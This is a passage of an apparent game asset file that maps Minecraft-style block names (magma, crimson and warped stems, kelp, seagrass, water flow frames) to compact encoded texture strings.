    "magma0": "0g0g9SH(HYYiWWWYH1z3Aw2z(0Bz6TNGyNNU)liUzxxzywNg2@(3N@zw+06UiXVzAihTlmxzBzwNki(ANR(3Bw26Xz0Bz2Rj(ANTNyUxxV]XzN*iC@(Nkw",
    "magma1": "0g0g9SHWYY(HiWWYH1z3xw2?(0z2hNnCVNxNhm*]TlA>A?yK+S2m(3+wNz02hUizlAmVRTzzmw+i(BNR(3w22kz0Az2myi(NRoNCTAUTzN)iy@(+]K",
    "magma2": "0g0gaSHWYYiW(HWHYH1z3Aw2?zC(0Dz2Noy?NDNhm,Rk?zx>FVzyxwN2m(3Nizw+R06?izlzklhx[AziwNm(xN(3Bw2i60xz6@jy@(NTNjCnnBlVn@NMRyi(Nw",
    
    "crimsonStem0": "0g0g8QWWJH]H0WHI(ZUZ0MI08/iT1Lv(Ovj3gdW)X]!(Zis1v(T$3N7h8)2w!I",
    "crimsonStem1": "0g0g8QWWI(Z]H0WHUZJH0(I0]Ni>2T1[-Loro(WujbO3gd+E@XA!h(hu1uET$3O{78)2w=8",
    "crimsonStem2": "0g0g8QWWI(Z]H0WHJHUZ0XM]0INi1LhvEOJ>gdW(@!Nh)Z9k1vEIT$3XOc68(1mwNh8",
    "crimsonStem3": "0g0g8QWW0W]HI(ZUZHJH0Q(I0IFiT1&m;!i}Sgd%ECXAFh(?9k1|tEXT$QN6gIE1mgFgI",
    "crimsonStem4": "0g0g8QWWI(Z]H0WHJHUZ0M]0I!J1L?xvEOjbSgdWE@X]*h(Zio1v(XT$3XO|6h8(2mw!h]",
    "crimsonStemSW0": "0g0g8QWWI(ZHJH]H0WUZ0^QoS6oZBKJED?rbn2MJBgi9s?-+%ks]@h]E$H+5iLS",
    "crimsonStemSW1": "0g0g8QWW0WHI(Z]HJHUZ0_oS6wZBUJEBy?9b]Qn2hJBri9o?E+@%kQk]?]E(H[5iLS",
    "crimsonStemSW2": "0g0g8QWW0W]HUZI(ZHJH0^QkS5(J@DKVKJoBy>97pQ.ee(1.JBgJ]J9Qq>-o%rck]?g)E5isS",
    "crimsonStemSW3": "0g0g8QWW0W]HUZI(ZHJH0^QkS5(UJ@CKJoC>97pQ.ee(1MPBg]_J9Qk>-o%rcQk]?gEEA5isS",
    "crimsonStemSW4": "0g0g8QWWHJHI(Z0W]HUZ0{qS700ZCJ(By@mIr3FiC}i9q@):3+oq]?hI)$Y95i,S",
    
    "warpedStem0": "0g0g8QWQZmZ]HlYi6HhYUZ0MI08/iT1Lv(Ovj3gdW)X]!(Zis1v(T$3N7h8)2w!I",
    "warpedStem1": "0g0g8QWQZhY]HlYi6HUZmZ0(I0]Ni>2T1[-Loro(WujbO3gd+E@XA!h(hu1uET$3O{78)2w=8",
    "warpedStem2": "0g0g8QWQZhY]HlYi6HmZUZ0XM]0INi1LhvEOJ>gdW(@!Nh)Z9k1vEIT$3XOc68(1mwNh8",
    "warpedStem3": "0g0g8QWQZlY]HhYUZi6HmZ0Q(I0IFiT1&m;!i}Sgd%ECXAFh(?9k1|tEXT$QN6gIE1mgFgI",
    "warpedStem4": "0g0g8QWQZhY]HlYi6HmZUZ0M]0I!J1L?xvEOjbSgdWE@X]*h(Zio1v(XT$3XO|6h8(2mw!h]",
    "warpedStemSW0": "0g0g8QWQZhYi6HmZ]HlYUZ0^QoS6oZBKJED?rbn2MJBgi9s?-+%ks]@h]E$H+5iLS",
    "warpedStemSW1": "0g0g8QWQZlYi6HhY]HmZUZ0_oS6wZBUJEBy?9b]Qn2hJBri9o?E+@%kQk]?]E(H[5iLS",
    "warpedStemSW2": "0g0g8QWQZlY]HUZhYi6HmZ0^QkS5(J@DKVKJoBy>97pQ.ee(1.JBgJ]J9Qq>-o%rck]?g)E5isS",
    "warpedStemSW3": "0g0g8QWQZlY]HUZhYi6HmZ0^QkS5(UJ@CKJoC>97pQ.ee(1MPBg]_J9Qk>-o%rcQk]?gEEA5isS",
    "warpedStemSW4": "0g0g8QWQZi6HmZhYlY]HUZ0{qS700ZCJ(By@mIr3FiC}i9q@):3+oq]?hI)$Y95i,S",
    
    endRod: "0g0gcZH000ZZZZYH7ZZHZHZHZZ00hyyz2yQ0yywNynyyyyyIyyyyyyyyyyOyyyyyOyyyyyOhhyyyyyyyyyyyyIyyyyyyyIyyyyyyyyyyyyyyyyyyyyyyyyyyyy0yyyyyyyyyyyyyyy",
		endRod2: "0g0gc000ZZZZH7ZYZZHZHHZHZZ000000000000000000000000i0000000x00000000000000000000000000000000000000000000000O)Q>0000*?V0000h?V0000h)Q>0000myyDgmyGg",
    
    itemFrameIcon: "0g0gi000AJHY8HWW2YyYBWWNYWDZZZZDZEYnYH0000000000000000000000001800000x8>gx0F^0oMxw0qg0%w0w0g0pw4^xw4^s.hw1gRwIT8Rxw1U^^w0000000000",
    
    kelpPlant: "0g0g8000VZ?Y3W|YWHZ00a000000006000001000@Em0700uS00006}000u00010006S002S00mSk6000c0",
    "kelpPlant0": "0g0g8000VZ?Y3W|YWHZ00a000000006000001000@Em0700uS00006}000u00010006S002S00mSk6000c0",
    "kelpPlant1": "0g0g8000VZ?Y3W|YWHZ00a006000060000010020m0600uS00006R000u0001000N000m000Y0bS6S00c0",
    "kelpPlant2": "0g0g8000VZ?Y3W|YWHZ00a00060000000000100m002Y0600q0600N2000000c000N000000Y01S06S00c0",
    "kelpPlant3": "0g0g8000VZ?Y3W|YWHZ00a000S0000pS0000100m6000E0700S6006S0000000c0mNK00000Y00006S00cS",
    "kelpPlant4": "0g0g8000VZ?Y3WW|YHZ00a000S0000pS0000100iS6002]00+w00S6006S0000t000d0i]N00J=000,000001000d0",
    "kelpPlant5": "0g0g8000VZ?Y3WW|YHZ001}P000S0000pS0000100i0600iPu02[A06S04006S0000uK0000d002]N00J=0000,000000000dw",
    "kelpPlant6": "0g0g8000VZ?Y3WZW|YH001|S00S/000pS0000100k070m:S100S00007S0000v000010m/d00000.=0000000001:",
    "kelpPlant7": "0g0g8000VZ?Y3WZW|YH001|00S:S00pS0000100007Sk:mD006S00007S0000v000107|0l0000,=0000000001(E",
    "kelpPlant8": "0g0g8000VZ?Y3WZW|YH001|S00pS,00E0000100007Skb:mD02S00007S0000v000010m7}00.T007D000000001(0",
    "kelpPlant9": "0g0g8000VZ?Y3WW|YHZ001|w003E0w00rE0000100006Pw01Cwi[02]S00006S0000u0000100iS6~02WuT00,000000001Y0",
    "kelpPlant10": "0g0g8000VZ?Y3WW|YHZ000F003E0000rE00000)P0006Gw00uwi@02WS000+6S0000u000010i06|0iPuS002W0006]0001Y0",
    "kelpPlant11": "0g0g8000VZ?Y3WW|YHZ000F400rE00003E000010006w00uwg90i@S002@6S0000u0001Y020002[000]Z0000rA000,A",
    "kelpPlant12": "0g0g8000VZ?Y3WW|YHZ000F400rE00003E000010006w00u00902=00i+0000030000*0000-00TA000Pv0000rPw000,A",
    "kelpPlant13": "0g0g8000VZ?YZ3W|YWH000F001xS0000xS00001007.01|0300rDS00g07S000040000+{0000000K+I000000d|000+.",
    "kelpPlant14": "0g0g8000VZ?Y3W|YWHZ000F000S0000S00001006S0020mS00006S000030000M00000000300270000O",
    "kelpPlant15": "0g0g8000VZ?Y3W|YWHZ001|000pS0000S00001006020m0k6S00006S0000u0000&000000003002Z:006O5",
    "kelpPlant16": "0g0g8000VZ?Y3W|YWHZ001{0000S0000pS00001b006S20m0k0S00006S000u0001000000003002HS200",
    "kelpPlant17": "0g0g8000VZ?Y3W|YWHZ001{0000S0000pS000011006mSk000S00006R000u00010006S00003000aZS2m10",
    "kelpPlant18": "0g0g8000VZ?Y3W|YWHZ001{000000000pS000010E26mSk000S(0006R000u000100006S0000S002mSk010",
    "kelpPlant19": "0g0g8000VZ?Y3W|YWHZ001|00000006w00001002EmYka000uT0006R000u000100006S000S002m00010",
    kelp: "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000000000000000A0001E0001{00004000J004iS46000=P0",
    "kelp0": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000000000000000A0001E0001{00004000J004iS46000=P0",
    "kelp1": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000000000040001A0009?000aw0000BK004J000A02Sw6JS00=P0",
    "kelp2": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000000A0001A0000aw0000qw0000BK00AJ000w00S06JS00=PJ0",
    "kelp3": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000001A0009A0000aw0000qK004B000AJ000w00006S00=PJS",
    "kelp4": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000001A00009w0000aw0000qK004JB000A000w+00000S00=PJS",
    "kelp5": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000w00001w00009w0000aK00000000JB000A0000+000000000=PJ]",
    "kelp6": "0g0g8000W3WZH?Y|YVZ000000000000000000000000000000000000001000009000009w0000w00000004000?)0000C00000A00007]",
    "kelp7": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000100000900000Pw0000^A0000qK00As0050000+0000000007(8",
    "kelp8": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000800000900000P00000w0000^K004Js000)0006000000007(0",
    "kelp9": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000800000900000Pw0000^w0000aK004s000000+00000007yS",
    "kelp10": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000S00000P00000P00000w0000aK004s004J0000006J0007NS",
    "kelp11": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000000000P000009w0000aw00009{0003000000i0000rJP000CP",
    "kelp12": "0g0g8000WZ3WH?Y|YVZ00000000000000000000000000000000000000000000P000009w0000aA00001{00003000gP000i0000ri]000CP",
    "kelp13": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000009w00009A00001Q0003{00003000g9000i0002_NP000T",
    "kelp14": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000009w00001A00001Q0001000300003000J6]0i000C",
    "kelp15": "0g0g8000W3WZH?Y|YVZ000000000000000000000000000000000000000000001E00009A00000A0000{000000002000Jy]0k+041",
    "kelp16": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000009w00001A00000E000000000003000iS0P0iN0",
    "kelp17": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000009A00001A0000E0000000400030002iS0C]470",
    "kelp18": "0g0g8000WZ3WH?Y|YVZ000000000000000000000000000000000000000000001A00000A0000E0003{00040000000J]4CS4070",
    "kelp19": "0g0g80003WWZH?Y|YVZ000000000000000000000000000000000000000000000F00000P00002|0000100004000A001yA90{N00070",
    
    tallSeagrassConnected: ["0g0g100W","0g0g100W"],
    "tallSeagrassBottom0": "0g0g6000/SH&0WFWYxKW0d0005002wh002wh0w2(h82RNg2S2R2122lllmJS",
    "tallSeagrassBottom1": "0g0g6000/SH&0WFWYxKW0d0005002wh002wh0w2(h82RNg2S2R2122lllmJS",
    "tallSeagrassBottom2": "0g0g6000/SH&0WFWYxKW0d0005002wh002wh0w2(M82Ryg2S22122l!l!lmJS",
    "tallSeagrassBottom3": "0g0g6000&0W/SHFWYxKW0iR800iR800iw00gKw0(Tg2TR82p2hS2bS1dS2b2akFlFSkFSmPS",
    "tallSeagrassBottom4": "0g0g6000/SH&0WYFWxKW0khS00khS00)iT00)io0-yx80/!xS0]yS0ia0Ak0Elw0Ek00Ah0kU!0m!l!mJ",
    "tallSeagrassBottom5": "0g0g6000/SH&0WYFWxKW0khS00khS00)iT00)io0-yx80/!xS0yS0a0Uk0Qlw0Ak00Ah0g!0m^!m!mi",
    "tallSeagrassBottom6": "0g0g6000/SH&0WYFWxKW02hS00khS00)iT00)io0-yx0/!xS0yS0a0Uk0Qlw0Uk00Uh0g!0m]!mRmR",
    "tallSeagrassBottom7": "0g0g6000/SH&0WYFWxKW02Sk002Sk00)iS)00)i)0-yw-0/!w/S0yKS0aK0UkKw0QlKw0UkF00UhB0gE!Sm]2mRmR",
    "tallSeagrassBottom8": "0g0g6000/SH&0WYFWxKW02Sk002Sk004iS)00)i)0-yw-0/!w/0yKS0aK0UkKU0QlKQ0UkU0Uhg!!Sm^2m2mR",
    "tallSeagrassBottom9": "0g0g6000/SH&0WYFWxKW02Sk002Sk006iS)00)i)0-yw-S0/!w/0yKS0aKS0UkKU0QlKQ0UkU0UhUg!!#Sm^2Vm2Vm2",
    "tallSeagrassBottom10": "0g0g6000/SH&0WYFWxKW02S402S4006iS)00)i)0-yw-S0/!w/0yKS0aK0UkKU0QlKQ0UkU0UhUg!!#Sm!Vm2m!",
    "tallSeagrassBottom11": "0g0g6000/SH&0WYFWxKW02S402Sk004iS)00)i)0-yw-S0/!w/0yKS0aK0UkKU0QlKQ0UkV00UhV0g!!FSm^!m!m!",
    "tallSeagrassBottom12": "0g0g6000/SH&0WYFWxKW02Sk00khSk00)iS)00)i)0-yw-S0/!w/0yKS0aK0UkKU0QlKQ0UkV00Uh0k!0m^!m!m!",
    "tallSeagrassBottom13": "0g0g6000/SH&0WYFWxKW0k1Sk001Sk01iS)01i)1yw-S1!w/2yKS2aK2kKA2wlKA1!kB01EhF0m!0m^!Vm!my",
    "tallSeagrassBottom14": "0g0g6000/SH&0WYFWxKW0kS00S01JT01J1yxS1!x2SyS0a1gk1glw1qk01!h0m!V0m!Ul!my",
    "tallSeagrassBottom15": "0g0g6000/SH&0WYFWxKW0S01wS01wT01w12xS1Rx2S222k2xlw2k02h0l0mUl!Vmy",
    "tallSeagrassBottom16": "0g0g6000/SH&0WFWYxKW0d000?002w002w0w2(x82Ry0g2S2R2122lllm",
    "tallSeagrassBottom17": "0g0g6000/SH&0WFWYxKW0d0005002wh002wh0w2(M82RNg2S2R2122lllmJ",
    "tallSeagrassBottom18": "0g0g6000/SH&0WFWYxKW0d0005002wh002wh0w2(h82RNg2S2R2122lllmJ",
    "tallSeagrassTop0": "0g0g5000Y/SH&0WFW0000000204000i0A000y0Q000N0000ySQ0018001g001o002w8I002w8I002wbI001j001kc001kd002(jd0",
    "tallSeagrassTop1": "0g0g5000Y/SH&0WFW0000000004000i0A000y0Q000N0000y8Q000i80018001b002waI002wbI002wb8001jc001kd001kd002(jd0",
    "tallSeagrassTop2": "0g0g5000Y/SH&0WFW00000000S40002SA000y0Q000N0000y8Q000N9c000Nac00wbd002wah002wbh002wbh001jd001kd001kd002(jd0",
    "tallSeagrassTop3": "0g0g5000Y/SH&0WFW00000000S0002S4004S8006Sc00y0800N9c00Nac00)bd000Qah000Abh000Abh000Ajd000Akd000A4d000@3d0",
    "tallSeagrassTop4": "0g0g5000Y/SH&0WFW00000000S0002S4004S8006Sc004T8006T800N1800)1d000Q2d000Q3d000Q3d000)31000)2100)2100@2200",
    "tallSeagrassTop5": "0g0g5000Y/SH&0WFW0000000080g000S0004S1g006S1004T1g006Tx006TT00)100Q1Rw00Q12w00Q12w00)200)200)200@q(0",
    "tallSeagrassTop6": "0g0g5000Y/SHFW&0W0000000080g000]0000I1g000S1004T2g008Tyg008TRg008006Tw006w006008008008009yS0",
    "tallSeagrassTop7": "0g0g5000Y/SH&0WFW00000000802000]0i000I0y000S0N004T0y006TwN006TSN006K)008SQ008KQ008KQ006K)006)006)006K@0",
    "tallSeagrassTop8": "0g0g5000Y/SH&0WFW00000000802000]02000S0y000S0N004T0y006TwN006TSN006K)008SQ008KQ008KQ006K)006)006)006K@0",
    "tallSeagrassTop9": "0g0g5000Y/SH&0WFW00000000S00S02S02S04S04S06S06S04T04S06Tw6S06TS6S06K608S408K408K406K406406406K@",
    "tallSeagrassTop10": "0g0g5000Y/SH&0WFW00000000S00S02S02S04S04S06S06S04S04S06Tw6S06TS6S06K608S808K808K806K606606406K6",
    "tallSeagrassTop11": "0g0g5000Y/SH&0WFW00000000S00S02S02S04S04S06S06S04S04S06Tw6S06TS6S06K608S808K808K406K406406406K6",
    "tallSeagrassTop12": "0g0g5000Y/SH&0WFW00000000S02002S0i004S0y006S0N004T0y006TwN006TSN006K)008SQ008KQ008KQ006K)006)006)006K@0",
    "tallSeagrassTop13": "0g0g5000Y/SH&0WFW00000000S0g002S0004S1g0060100411g0021xg00N1Rg00)1w00Q1Rw00Q1KS00Q1KQ00)2K)00)2)00)2+00@2K@0",
    "tallSeagrassTop14": "0g0g5000Y/SH&0WFW000000020000i0000y0000N0000y11000N1x00N1T00)100Q1Rw00Q1w00Q1w00)200)200)200@2(0",
    "tallSeagrassTop15": "0g0g5000Y/SH&0WFW000000020000i0400y0800N0c00y8800N9c00Nac00)bd002)ah001bh001A3h001w21001w21001w201(2(0",
    "tallSeagrassTop16": "0g0g5000Y/SH&0WFW0000000204000i0A000y0Q000N0000y8Q000N9c000gac01bd002wah002wbh002wbh001jd001kd001kd002(3d0",
    "tallSeagrassTop17": "0g0g5000Y/SH&0WFW0000000204000i0A000y0Q000N0000y8Q000g80018001b002waI002wbI002wbg001jd001kd001kd002(jd0",
    "tallSeagrassTop18": "0g0g5000Y/SH&0WFW0000000204000i0A000y0Q000N0000ySQ0018001g001o002w8I002w8I002wbI001j001kc001kd002(jd0",
    seagrass:"0g0g100W",
    "seagrass0": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g00000k10000m0S000400S0600S000g830wKw11Sww1]+oca+XK^lJTS",
    "seagrass1": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g0000080000m20000C3020060200m008w10co11Sx01]+oc9Xc^li_S",
    "seagrass2": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g0000080000i0000)30200+00S0k008z10co11B01]+zc9Xc]lg_S",
    "seagrass3": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g0000080000g0001)300S0+100S0k009k310cK11lo1]Cc9lXc]lg_",
    "seagrass4": "0g0g6000Y/SH&0WxKWFW00000000000000000000000002000008000020001(30080)100S0+g001k10dRK11Awd]@Xc1lXc8lg_",
    "seagrass5": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k10000g0001(o0080+800S0g001m10o1Q10Eczc1]l@c1lXc9lgT",
    "seagrass6": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k10000g0001(o0080+800]0g001k101480Eczc1lXc18mc9lgT",
    "seagrass7": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k1000020001(o0080C800I0g001o80cw81]czc0!ec1Em9lgT",
    "seagrass8": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k10000m20001+b0080C00I0005o10cw81]czc0!20!m1ilgP",
    "seagrass9": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k0w000m20000C30080+8008500510cw11Sczc1]20!21!lgP",
    "seagrass10": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k0w000m20000C30080+8008800g510cw10c120r11!mgP",
    "seagrass11": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000200000k0w000m0S000C30010+8008000g810g6h010]1Sm1141imgP",
    "seagrass12": "0g0g6000Y/SH&0WxKWFW00000000000000000000000002000002w000kS000C30010+80010g00i810g6h0108d0E@1149glgT",
    "seagrass13": "0g0g6000Y/SH&0WFWxKW00000000000000000000000002000002w0002S0004K010+10010g0028o0wkS108c0whK1gh?bghko",
    "seagrass14": "0g0g6000Y/SH&0WxKWFW00000000000000000000000002000004w0002S0004K080C10010g0028o0w3O010Exoc08e(1ls^lT",
    "seagrass15": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g000004w0002S0004K080C008020028o0w3K010Ewc1]M01SdzI^lT",
    "seagrass16": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g00000A0w0002K0004K0S0C0080200i830w3Kw0wEwd1]M00e*z^lT",
    "seagrass17": "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g00000k100002K0004K0S060080200g830woKw0xSAw1])oca)wK^lT",
    seagrassIcon: "0g0g6000Y/SH&0WxKWFW0000000000000000000000000g0000080000g0001)300S0+100S0k009k310cK11lo1]Cc9lXc]lg_",
    
    waterFlow:"0g0g100W",
    "waterFlow0": "0g0ga%c%%;0ixz?xhC1yxzxhA2yxzKyhE2yyEMxxDRyyh1gRiy12hNiy1h2iiJ1h1hiJEhihh2Dh21h42wh21xk2xwn21wk2xwEi1Bm2xw8h1AkixD8h1AoixAxhA",
    "waterFlow1": "0g0ga%c%%;0ixz?xhC1yxzxhA2yxzKyhE2yyEMxxDRyyh1gRiy12hNiy1h2iiJ1h1hiJEhihh2Dh21h42wh21xk2xwn21wk2xwoi1Bm2xw8h1AkixD8h1AoixAxhA",
    "waterFlow2": "0g0ga%c%%;0hij?iyj2hijiyk1hijKiyk1hhNiinThhJy2wTxhX21yMxhX2y1xJx2y2yxpyxyy1ny12y41gy12iA1igD12gA1igFx2lC1ig9y2kAxin9y2kBxikiyX",
    "waterFlow3": "0g0ga%c%%;0hij?iyj2hijiyk1hijKiyk1hhNiinThhJy2wTxhX21yMxhX2y1xJx2y2yxpyxyy1ny12y41gy12iA1igD12gA1igFx2lC1ig9y2kAxin9y2kBxikiyX",
    "waterFlow4": "0g0ga%%c%;12wzTw02wDMw0EKywDXw0zywDy0FyyFwwANyy0K6N2yRK02yK022K0K02F0200oA0K0C0Kw3wC4KC3wC92Kx8wC0Kz32wA0Kz",
    "waterFlow5": "0g0ga%%c%;12wzTw02wDMw0EKywDXw0zywDy0FyyFwwANyy0K6N2yRK02yK022K0K02F0200oA0K0C0Kw3wC4KC3wC92Kx8wC0Kz32wA0Kz",
    "waterFlow6": "0g0ga%c%%;12wzTw0zVywC,w0CywCXw0zywCw0zyyKwwANyyg05N2yR02y02g2J00l2Jx0200A00B0w3wB4B3wB12D8wB0z32wA0z",
    "waterFlow7": "0g0ga%c%%;12wzTw0zVywC,w0CywCXw0zywCw0zyyKwwANyyg05N2yR02y02g2J00l2Jx0200A00B0w3wB4B3wB12D8wB0z32wA0z",
    "waterFlow8": "0g0gbc%%;%12wz?0052wB*w0E42wBw0x02w!w2E22w!kw2EN2ywyziywR4i2yNS20i2yR0202yS020U2yxS200Rw!0240?RwA02Sw]RwA42Qw9RwAa0QA8RwAT44F",
    "waterFlow9": "0g0gbc%%;%12wz?0052wB*w0E42wBw0x02w!w2E22w!kw2EN2ywyziywR4i2yNS20i2yR0202yS020U2yxS200Rw!0240?RwA02Sw]RwA42Qw9RwAa0QA8RwAT44F",
    "waterFlow10": "0g0gbc%%;%12wz?0052wB*w0E42wBw0x02w!w2F22w!kw2EN2yxwy!iywR4i2yNS20i2yR0202yS020U2yxS200Rw!0240?RwA02Sw]RwA42Qw9RwA!0QA8RwAT44F",
    "waterFlow11": "0g0gbc%%;%12wz?0052wB*w0E42wBw0x02w!w2F22w!kw2EN2yxwy!iywR4i2yNS20i2yR0202yS020U2yxS200Rw!0240?RwA02Sw]RwA42Qw9RwAa0QA8RwAT44F",
    "waterFlow12": "0g0gb%c%;%1z(NA22*43(+D0073(,(0M23(,(0)03(/m(3M33(/R(3M3OX(O+>O(z2>3Ow30>3Oz0303Ow0303O)w300z(/0320Dz(N03w(xz(N23y(5z(Na0yN",
    "waterFlow13": "0g0gb%c%;%1z(NA22*43(+D0073(,(0M23(,(0)03(/m(3M33(/R(3M3OX(O+>O(z2>3Ow30>3Oz0303Ow0303O)w300z(/0320Dz(N03w(xz(N23y(5z(Na0yN",
    "waterFlow14": "0g0gb%c%;%1z(NA22*43(+D0073(,(0M23(,(0)03(/m(3*33(/R(3M3O)(O/>O(z2>3Ow30>3Oz0303Ow0303O)w300z(/0320Dz(N03w(xz(N23y(5z(Na0yN",
    "waterFlow15": "0g0gb%c%;%1z(NA22*43(+D0073(,(0M23(,(0)03(/m(3*33(/R(3M3O)(O/>O(z2>3Ow30>3Oz0303Ow0303O)w300z(/0320Dz(N03w(xz(N23y(5z(Na0yN",
    "waterFlow16": "0g0gb;%%c%12z))O(w56z)5((x72z-7w(/NzwazOB(NzwzODONzwzNBNNywzNB2NyB>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z52zA(N(z",
    "waterFlow17": "0g0gb;%%c%12z))O(w56z)5((x72z-7w(/NzwazOB(NzwzODONzwzNBNNywzNB2NyB>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z52zA(N(z",
    "waterFlow18": "0g0gb;%%c%12z))O(w56z)5((x72z-7w()Nz-awOB(Nz(zODONz(zOBNNywzNB2NyB>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z52zA(N(z",
    "waterFlow19": "0g0gb;%%c%12z))O(w56z)5((x72z-7w()Nz-awOB(Nz(zODONz(zOBNNywzNB2NyB>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(z82zwON(z52zA(N(z",
    "waterFlow20": "0g0gb%%;c%12zA(N(z52z))O(w16z)1((B72z-7w(/NzwazOx(NzwzODONzwzNxNNywzNx2Nyx>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z",
    "waterFlow21": "0g0gb%%;c%12zA(N(z52z))O(w16z)1((B72z-7w(/NzwazOx(NzwzODONzwzNxNNywzNx2Nyx>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z",
    "waterFlow22": "0g0gb%%;c%12zA(N(z52z))O(w16z)1((B72z-7w()Nz-awOx(Nz(zODONz(zOxNNywzNx2Nyx>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z",
    "waterFlow23": "0g0gb%%;c%12zA(N(z52z))O(w16z)1((B72z-7w()Nz-awOx(Nz(zODONz(zOxNNywzNx2Nyx>zN)RNzN(Ryy3NORNy2ONO>Ny3ON(>NyD3NOO2yE3N(O82zwON(z",
    "waterFlow24": "0g0gb%%c%;1iOAyzxM5jOCxzwMnjOEANxMljNE5MxmzNAlMxAzNwoMy*xzNxoNy+yzNxgNy*zzOxhNy*jz*iNyAjOO*iNNhjOO*2iNijNOiiNiiNO+iyNx2yO)izOx2iOMizMx",
    "waterFlow25": "0g0gb%%c%;1iOAyzxM5jOCxzwMnjOEANxMljNE5MxmzNAlMxAzNwoMy*xzNxoNy+yzNxgNy*zzOxhNy*jz*iNyAjOO*iNNhjOO*2iNijNOiiNiiNO+iyNx2yO)izOx2iOMizMx",
    "waterFlow26": "0g0gb%%c%;1iOAyzxM5jOCxzwMnjOEANxMljNE5MxmzNAlMxAzNAmMx*xzNxoMy+yzNxkNy*zzOxhNy*jzBiNyAjOO*iNNhjOO*2iNijNOiiNiiNO+iyNx2yO)izOx2iOMizMx",
    "waterFlow27": "0g0gb%%c%;1iOAyzxM5jOCxzwMnjOEANxMljNE5MxmzNAlMxAzNAmMx*xzNxoMy+yzNxkNy*zzOxhNy*jzBiNyAjOO*iNNhjOO*2iNijNOiiNiiNO+iyNx2yO)izOx2iOMizMx",
    "waterFlow28": "0g0gb%%c%;1xONxjNi2xOkhjiN5zOmijgNDzOokMiNBzMo5NiCjMkBNikjMgENh*ijMiEMh+hjMiwMh*jjOiyMh*zj*xMhkzOO*xMMyzOO*1xMxzMOxxMxxMO+xhMi1hO)xjOi",
    "waterFlow29": "0g0gb%%c%;1xONxjNi2zOkhjiN5zOmijgNDzOokMiNBzMo5NiCjMkBNikjMgENh*ijMiEMh+hjMiwMh*jjOiyMh*zj*xMhkzOO*xMMyzOO*1xMxzMOxxMxxMO+xhMi1hO)xjOi",
    "waterFlow30": "0g0gb%%c%;1xONxjNi2xOkhjiN5zOmijgNDzOokMiNBzMo5NiCjMkBNikjMkCNi*ijMiENh+hjMiAMh*jjOiyMh*zjlxMhkzOO*xMMyzOO*1xMxzMOxxMxxMO+xhMi1hO)xjOi",
    "waterFlow31": "0g0gb%%c%;1xONxjNi2xOkhjiN5zOmijgNDzOokMiNBzMo5NiCjMkBNikjMkCNi*ijMiENh+hjMiAMh*jjOiyMh*zjlxMhkzOO*xMMyzOO*1xMxzMOxxMxxMO+xhMi1hO)xjOi",
    "waterFlow32": "0g0ga%c%%;1hyjQixk1TykQiAk4TyghiAA5iymkiDAix@gxnA+iS*AjSiS*AjnTxn@AkBkhxkSAhChhxk[xhBihykQxhBihJghxh[RhywThhQRxyDMTxTRxyTTxQThyDTRxQ",
    "waterFlow33": "0g0ga%c%%;1hyjQixk1TykQiAk4TyghiAA5iymkiDAix@gxnA+iS*AjSiS*AjnTxn@AkBkhxkSAhChhxk[xhBihykQxhBihJghxh[RhywThhQRxyDMTxTRxyTTxQThyDTRxQ",
    "waterFlow34": "0g0ga%c%%;1hyjQixk1TykQiAk4TyghiAA5iymkiDAix@gxnA+iS*AjSiS*Aj[T[@AkCkhQSAkBhhk[xhEihkQxhBihJghxh[RhywThhQRxyDMTxTRxyTTxQThyDTRxQ",
    "waterFlow35": "0g0ga%c%%;1hyjQixk1TykQiAk4TyghiAA5iymkiDAix@gxnA+iS*AjSiS*Aj[T[@AkCkhQSAkBhhk[xhEihkQxhBihJghxh[RhywThhQRxyDMTxTRxyTTxQThyDTRxQ",
    "waterFlow36": "0g0ga%%c%;1hyz12x0Thyl0ixgT1yg0iwgS1ykhiww@iyngizw-ix7kxjwi4wl4i4wlj1xj7wgCghxg4whDhhxg3xhCihyg0xhCihJkhxh32hyA1hh02xyz1x12xy11x0",
    "waterFlow37": "0g0ga%%c%;1hyz12x0Thyl0ixgT1yg0iwgS1ykhiww@iyngizw-ix7kxjwi4wl4i4wlj1xj7wgCghxg4whDhhxg3xhCihyg0xhCihJkhxh32hyA1hh02xyz1x12xy11x0",
